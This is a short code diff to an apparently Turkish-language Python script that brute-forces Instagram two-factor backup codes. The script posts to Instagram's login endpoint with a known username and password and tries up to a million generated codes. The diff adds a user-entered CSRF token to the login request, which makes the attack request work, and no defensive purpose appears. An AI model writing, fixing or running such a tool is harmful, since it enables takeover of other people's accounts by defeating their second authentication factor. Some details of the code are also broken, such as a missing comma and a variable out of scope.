@@ -13,7 +13,7 @@ def brute_force_backup_codes(username, password, backup_codes):
     url = 'https://www.instagram.com/accounts/login/ajax/'
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
-        'X-CSRFToken': '',
+        'X-CSRFToken': csrf_token,
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     data = {
@@ -34,6 +34,7 @@ def brute_force_backup_codes(username, password, backup_codes):
 def main():
     username = input('Kullanıcı adını girin: ')
     password = input('Şifreyi girin: ')
+    csrf_token=input('Csrf Tokeninizi girin: ')
     backup_codes = generate_backup_codes(1000000)  # generate 1,000,000 random backup codes
     valid_code = brute_force_backup_codes(username, password, backup_codes)
     if valid_code:
